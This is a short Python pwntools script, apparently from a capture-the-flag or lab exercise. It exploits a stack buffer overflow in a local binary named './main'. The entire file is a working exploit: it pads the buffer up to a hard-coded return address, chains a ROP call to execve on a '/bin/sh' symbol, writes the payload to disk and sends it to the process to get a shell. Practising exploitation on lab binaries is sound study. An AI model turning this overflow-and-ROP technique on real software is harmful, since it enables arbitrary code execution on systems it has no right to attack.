from pwn import *

context.clear(arch='i386')
c = constants

binary   = ELF('./main')

# Finally, let's build our ROP stack

context.kernel = 'amd64'
rop   = ROP(binary)
binsh = binary.symbols['binsh']
rop.execve(binsh, 0, 0)
print rop.dump()

# Create exploit with pading

payloadStr = ''
bufferAddr = 0x7fffffffdb50
returnAddr = 0x7fffffffdb68
for i in xrange(0, returnAddr - bufferAddr):
    payloadStr += 'a'
payloadStr += str(rop)

# Save exploit code

with open('payload', 'wb') as pFile:
    pFile.write(payloadStr)

# Let's try it out!

p = process(binary.path)
p.send(payloadStr)
time.sleep(1)
p.sendline('echo hello; exit')
p.recvline()
